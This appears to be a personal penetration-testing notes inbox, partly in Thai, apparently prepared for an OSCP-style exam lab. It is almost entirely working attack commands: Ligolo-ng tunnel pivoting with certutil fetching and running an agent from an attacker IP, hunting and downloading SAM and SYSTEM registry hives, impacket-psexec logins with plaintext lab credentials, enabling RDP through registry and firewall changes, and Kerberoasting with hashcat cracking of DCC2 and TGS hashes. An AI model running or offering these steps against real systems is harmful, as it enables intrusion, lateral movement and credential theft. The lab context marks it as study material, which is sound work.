---
title: Prompt Inbox
type: inbox
tags: [Inbox, Triage]
---

# Prompt Inbox

Drop raw commands, snippets, or notes under one of the pending sections. I will move each item into the closest topic file, normalize tags/frontmatter, and record where it went under `Moved`.

## Examples

Single command example:

```sh
nmap -sC -sV <TARGET_IP>
```

Command set / step example:

```sh
smbclient //<TARGET_IP>/<SHARE> -U '<DOMAIN>/<USER>%<PASS>'
recurse ON
prompt OFF
mget *
```

## Pending - Single Commands

<!-- Add new one-line commands below this line. -->

## Pending - Command Sets / Steps

<!-- Add new command sets below this line. -->
## Pivot to Internal Network (Ligolo-ng)
Setup Ligolo-ng บน Attacker Machine
> Download: [https://github.com/Nicocha30/ligolo-ng/releases](https://github.com/Nicocha30/ligolo-ng/releases)
```bash
# If fail for interface exising, Clear routing cache
sudo ip route flush cache
# Delete old interface
sudo ip link delete ligolo
sudo ip link delete darlingleopardo
--------------------------------
# At Kali - For setup ligolo (can set with any priv user)
# Create interface name 'ligolo'
sudo ip tuntap add user salmonbara mode tun ligolo
# set interface to up
sudo ip link set ligolo up
# start proxy
sudo ./proxy -selfcert

# Deploy Ligolo Agent
# At Target download agent.exe from kali to 
certutil.exe -urlcache -f http://192.168.45.178/ligolo/agent.exe \Users\Public\agent.exe
# tun0 IP
.\agent.exe -connect 192.168.45.178:11601 -ignore-cert

# At kali, get session
session

# วิธีที่ 1: ใช้ autoroute (แนะนำ)
autoroute
    → เลือก subnet (e.g, 10.10.128.147/24)
    → Create interface หรือ Use existing -> ligolo
    → Start tunnel = Yes

# วิธีที่ 2: Manual
start  # เริ่ม tunnel
ifconfig  # ดู internal IP
# At kali, เพิ่ม route สำหรับ internal subnet
sudo ip route add 10.10.79.0/24 dev ligolo

# ถ้าหลังจาก route add แล้วขึ้น File exists ให้เช็คต่อไปนี้
# เช็คว่า IP นี้ถูก route add แล้วหรือยัง
ip route | grep 10.10.79
# เช็คว่า packet จะออก interface ไหน
ip route get 10.10.79.154
```

```
Get-ChildItem C:\windows.old -Recurse -ErrorAction SilentlyContinue -Include *sam*
Get-ChildItem C:\windows.old -Recurse -ErrorAction SilentlyContinue -Include *system*

dir C:\windows.old\*sam* /s /b
dir C:\windows.old\*system* /s /b

download SAM
download SYSTEM
```

Enable RDP service
```powershell
# remote using impacket-psexec
impacket-psexec 'Eric.Wallows:EricLikesRunning800'@192.168.209.141
# เปิด RDP (0 = allow RDP) (optional)
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
# เปิด firewall rule สำหรับ RDP
snetsh advfirewall firewall set rule group="remote desktop" new enable=Yes
# start RDP service
sc start TermService
# check port 3389
netstat -ano | findstr 3389
```

crack DCC2 hash (long time)
```sh
# Crack admin account (DCC2 = mode 2100)
echo '$DCC2$10240#offsec#a....57a' > offsec.hash
hashcat -m 2100 offsec.hash /usr/share/wordlists/rockyou.txt
```

```sh
impacket-GetUserSPNs 'OSCP.EXAM/Eric.Wallows:EricLikesRunning800' \
  -dc-ip 10.10.128.146 -request
  
# Crack TGS ticket (hashcat mode 13100)
echo '$krb5tgs$23$*sql_svc$OSCP.EXAM$OSCP.EXAM/sql_svc*$0176..' > sql_svc.hash
hashcat -m 13100 sql_svc.hash /usr/share/wordlists/rockyou.txt
```
## Moved

